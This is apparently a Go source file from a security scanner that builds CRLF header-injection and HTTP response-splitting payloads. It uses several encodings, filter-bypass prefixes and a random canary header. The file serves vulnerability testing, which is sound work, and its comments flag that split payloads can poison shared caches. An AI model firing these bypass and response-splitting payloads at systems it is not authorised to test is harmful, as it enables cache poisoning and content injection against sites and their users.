// Package payload builds the CRLF injection strings used to probe a target.
//
// A payload is assembled from three independent parts:
//
//	<prefix><terminator><canary header>
//
// The terminator is the encoded CR/LF sequence we hope the target decodes into
// real control bytes. The canary header is the header line we expect to appear
// in the response if it does. The prefix is an optional context-escape or
// filter-bypass sequence placed in front.
//
// Payloads carry a tier so a scan can trade coverage for request count:
//
//	tier 1  the encodings that account for nearly every real-world finding
//	tier 2  adds the common filter-bypass encodings
//	tier 3  adds exotic encodings, for when a sink is known to exist
package payload

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"sort"
	"strconv"
)

// Encoding is one way of representing the CR and LF control bytes such that
// they survive transport and are turned back into control characters by the
// target.
type Encoding struct {
	ID   string
	CR   string
	LF   string
	Tier int
	Note string
}

var encodings = []Encoding{
	{"pct", "%0d", "%0a", 1, "standard percent-encoding"},
	{"pct-upper", "%0D", "%0A", 1, "uppercase hex, defeats case-sensitive denylists"},
	{"pct-double", "%250d", "%250a", 2, "double-encoded, for sinks that URL-decode twice"},
	{"unicode-cjk", "%e5%98%8d", "%e5%98%8a", 2, "U+560D/U+560A, truncated to 0x0D/0x0A by lossy 16->8 bit casts"},
	{"pct-triple", "%25250d", "%25250a", 3, "triple-encoded"},
	{"overlong-2", "%c0%8d", "%c0%8a", 3, "overlong 2-byte UTF-8"},
	{"overlong-3", "%e0%80%8d", "%e0%80%8a", 3, "overlong 3-byte UTF-8"},
}

// sequence is the line terminator built from an encoding. Bare LF is kept at
// tier 1 deliberately: nginx, Node and Go all accept a bare LF as a header
// terminator, so LF-only injection succeeds on targets where full CRLF is
// filtered.
type sequence struct {
	id   string
	tier int
	fn   func(Encoding) string
}

var sequences = []sequence{
	{"crlf", 1, func(e Encoding) string { return e.CR + e.LF }},
	{"lf", 1, func(e Encoding) string { return e.LF }},
	{"cr", 1, func(e Encoding) string { return e.CR }},
	{"crlf-sp", 3, func(e Encoding) string { return e.CR + e.LF + "%20" }},
	{"cr-tab", 3, func(e Encoding) string { return e.CR + "%09" }},
}

// prefix is placed in front of the terminator to break out of the surrounding
// parse context or to confuse a sanitiser that scans from the left.
type prefix struct {
	id   string
	tier int
	val  string
}

var prefixes = []prefix{
	{"none", 1, ""},
	{"null", 2, "%00"},
	{"query", 2, "%3f"},
	{"space", 3, "%20"},
	{"traversal", 3, "/..%2f"},
}

// Canary is the per-run random marker. Both the header name and its value are
// random, which is what makes a hit unambiguous: a target cannot emit this
// header by coincidence, and a cached or load-balanced response from an
// unrelated scan cannot be mistaken for a finding.
type Canary struct {
	Header string
	Value  string
}

// NewCanary returns a fresh random canary.
func NewCanary() (Canary, error) {
	b := make([]byte, 10)
	if _, err := rand.Read(b); err != nil {
		return Canary{}, fmt.Errorf("generating canary: %w", err)
	}
	return Canary{
		Header: "X-Clrfkd-" + hex.EncodeToString(b[:4]),
		Value:  hex.EncodeToString(b[4:]),
	}, nil
}

// Payload is one concrete injection string.
type Payload struct {
	ID    string // stable identifier, e.g. "pct/crlf/none"
	Tier  int
	Value string // the string to place at an injection point
	Split bool   // injects a complete second response, not just a header
	Note  string
}

// Set returns the payloads for a tier, ordered cheapest-and-most-likely first
// so that an early-exit scan spends its first requests where findings are.
//
// When split is true a response-splitting variant is emitted ahead of each
// plain one. A working split payload proves the more severe bug and subsumes
// the plain result, so trying it first means an early-exit scan reports
// critical rather than high; if the sink is too narrow for a whole response the
// plain payload behind it still catches the header injection. Split payloads
// write a complete fake response, which can poison a shared cache, so callers
// must opt in.
func Set(tier int, split bool, c Canary) []Payload {
	var out []Payload
	for _, e := range encodings {
		for _, s := range sequences {
			for _, p := range prefixes {
				t := maxInt(e.Tier, s.tier, p.tier)
				if t > tier {
					continue
				}
				term := s.fn(e)
				id := e.ID + "/" + s.id + "/" + p.id
				if split {
					out = append(out, Payload{
						ID:    id + "/split",
						Tier:  t,
						Value: p.val + splitBody(term, c),
						Split: true,
						Note:  e.Note + " (full response split)",
					})
				}
				out = append(out, Payload{
					ID:    id,
					Tier:  t,
					Value: p.val + term + c.Header + "%3a%20" + c.Value,
					Note:  e.Note,
				})
			}
		}
	}
	sort.SliceStable(out, func(i, j int) bool { return out[i].Tier < out[j].Tier })
	return out
}

// splitBody terminates the current response and writes a complete second one.
// Seeing this second response come back on the wire is what distinguishes
// header injection from true response splitting.
func splitBody(term string, c Canary) string {
	html := "<html>" + c.Value + "</html>"
	return term + "Content-Length:%200" + term + term +
		"HTTP/1.1%20200%20OK" + term +
		c.Header + "%3a%20" + c.Value + term +
		"Content-Type:%20text/html" + term +
		"Content-Length:%20" + strconv.Itoa(len(html)) + term + term +
		html
}

func maxInt(v ...int) int {
	m := v[0]
	for _, x := range v[1:] {
		if x > m {
			m = x
		}
	}
	return m
}
